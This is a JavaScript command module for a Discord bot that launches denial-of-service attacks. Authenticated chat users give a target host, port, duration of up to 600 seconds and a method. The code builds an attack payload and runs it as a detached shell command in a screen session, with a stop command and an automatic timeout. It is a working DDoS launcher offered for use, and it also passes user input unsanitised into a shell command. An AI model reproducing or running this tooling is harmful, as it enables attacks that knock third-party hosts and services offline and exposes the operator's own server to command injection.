const Discord = require("discord.js");

const authenticate = require('../../authentication/authenticate')

const launch = require('../../functions/launch')
const { getPayload } = require('../../functions/check')
const { methods } = require('../../ddos.json')

var beingused = false;
var distributed_timeout 

async function stop_ddos_attack(message)
{
  clearTimeout(distributed_timeout)

  await launch("./stopdos.sh");
  beingused = false
  const DOSEmbed3 = new Discord.MessageEmbed()
  .setColor('#2C2F33')
  .setTitle('Attack has been stopped')
  .setDescription(`${message.author.tag} has stopped the ongoing attack.`)
  message.channel.send(DOSEmbed3);
}

module.exports= {
  name: 'ddos',
  category: 'security',
  description: 'Disturbed denial of service attack against a particular host.',
  run: async (client,message,args,guild) => {
    if (!args[0]) {
      let muteinfoembed = new Discord.MessageEmbed()
        .setTitle("Command: ddos")
        .setDescription(
          `**Description:** Disturbed denial of service attack against a particular host.. \n` +
            "**Usage:**\n" +
            "-ddos [target] [port] [time/s] [method]\n" +
            "-ddos stop\n" +
            "-ddos methods"
        )
        .setColor("#2C2F33");
      message.channel.send(muteinfoembed);

      return;
    }
    if(beingused && args[0].toLowerCase() == 'stop')
    {
      return stop_ddos_attack(message)
    }
    if(args[0].toLowerCase() == 'methods') {
      let ch = ""
      methods.forEach((e) => {
        ch += `**${e.name}** : ${e.description}\n`
      })
      const emblemembed = new Discord.MessageEmbed()
        .setTitle(`Command: ddos (methods)`)
        .setDescription(ch)
        .setColor("#2C2F33");
      return message.channel.send(emblemembed);
    }
    let auth = await authenticate(message)
    if(!auth)
      return
    
    if(beingused)
    {
      const unsuccessfulembe = new Discord.MessageEmbed()
        .setTitle(`This command is being in use by someone else, please try again later.`)
        .setDescription(`You can stop it by using : -ddos stop`)
        .setColor("#2C2F33");
      return message.channel.send(unsuccessfulembe);
    }

    const port_string = parseInt(args[1]);
    const parsed_string = parseInt(args[2]);
    let time_out = Math.min(Math.floor(parsed_string), 600);

    if(time_out > 600 || time_out < 10 || isNaN(time_out))
    {
      const unsuccessfulembed2 = new Discord.MessageEmbed()
        .setTitle(`Please under a valid number between 10s and 600s.`)
        .setColor("#2C2F33");
      return message.channel.send(unsuccessfulembed2);
    }

    let atkmethod = 3
    const payload = getPayload({
      target : args[0],
      port : port_string,
      duration : time_out,
      method : args[3] 
    })

    if(!payload){
      const unsuccessfulembed45 = new Discord.MessageEmbed()
        .setTitle(`Invalid method.`)
        .setDescription(`do -ddos methods to view available methods.`)
        .setColor("#2C2F33");
      return message.channel.send(unsuccessfulembed45);
    }
    const shellPayload = `screen -S ddosing_shit -dm ${payload}`
    beingused = true
    let result = await launch(shellPayload)
    console.log(JSON.stringify(result))
    const count = result.filter((v) => {
      v.success
    }).length
    const DOSEmbed2 = new Discord.MessageEmbed()
    .setColor('#2C2F33')
    .setTitle(`(${count}/${result.length}) concurrent connections`)
    .setDescription(`${message.author.tag} -> Target: **${args[0]}**\n
      Port: **${port_string}**\n
      Time: **${time_out}**s\n
      Method: **${args[3].toLowerCase()}**`)

    message.channel.send(DOSEmbed2);
    time_out *= 1000;
    distributed_timeout = setTimeout( async () => { 
      stop_ddos_attack(message)
    }, time_out + 500);
  }
}
